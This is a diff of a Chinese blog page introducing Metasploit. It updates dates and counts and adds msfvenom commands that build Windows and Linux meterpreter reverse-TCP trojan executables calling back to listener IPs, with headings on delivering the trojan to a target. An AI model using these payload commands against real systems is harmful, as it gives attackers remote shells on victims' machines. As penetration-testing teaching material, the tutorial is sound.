@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
+<meta name="description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
 <meta name="keywords" content="Metasploit">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Metasploit(MSF)入门">
 <meta property="og:url" content="https://jeremyekek.github.io/2019/03/14/Metasploit-MSF/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
+<meta property="og:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-01T04:58:59.988Z">
+<meta property="og:updated_time" content="2019-07-18T13:09:45.298Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploit(MSF)入门">
-<meta name="twitter:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 1msfvenom">
+<meta name="twitter:description" content="一、Metasploit介绍综合利用工具，集成了上千种漏洞利用方式，操作简单易上手。 二、Metasploit启动kali集成了Metasploit框架，依赖于postgresql数据库  先启动数据库 1/etc/init.d/postgresql start  启动MSF 1msfconsole   三、生成木马程序利用MSF生成木马获取meterpreter反弹shell 123msfven">
 
 
 
@@ -285,8 +285,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-05-01T12:58:59+08:00">
-                2019-05-01
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-18T21:09:45+08:00">
+                2019-07-18
               </time>
             
           </span>
@@ -362,9 +362,9 @@
 </li>
 </ol>
 <h2 id="三、生成木马程序"><a href="#三、生成木马程序" class="headerlink" title="三、生成木马程序"></a>三、生成木马程序</h2><p>利用MSF生成木马获取meterpreter反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.14 lport=8787 -f exe &gt;./demo.exe</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.131 lport=4444 -f exe -a x86 --platform win -o shell.exe</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<p>-p  选用什么payload<br>lhost  监听ip<br>lport  监听端口<br>-f  生成文件的类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p  	选用什么payload</span><br><span class="line">lhost  	监听ip</span><br><span class="line">lport  	监听端口</span><br><span class="line">-a		系统位数</span><br><span class="line">-f  	生成文件的类型</span><br><span class="line">-o		输出</span><br></pre></td></tr></table></figure>
 <h2 id="四、投放木马到目标机上"><a href="#四、投放木马到目标机上" class="headerlink" title="四、投放木马到目标机上"></a>四、投放木马到目标机上</h2><h2 id="五、开启监听"><a href="#五、开启监听" class="headerlink" title="五、开启监听"></a>五、开启监听</h2><p>启用MSF，具体操作如下：</p>
 <ol>
 <li><p>加载expuse </p>
@@ -521,7 +521,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -532,7 +532,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -543,7 +543,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
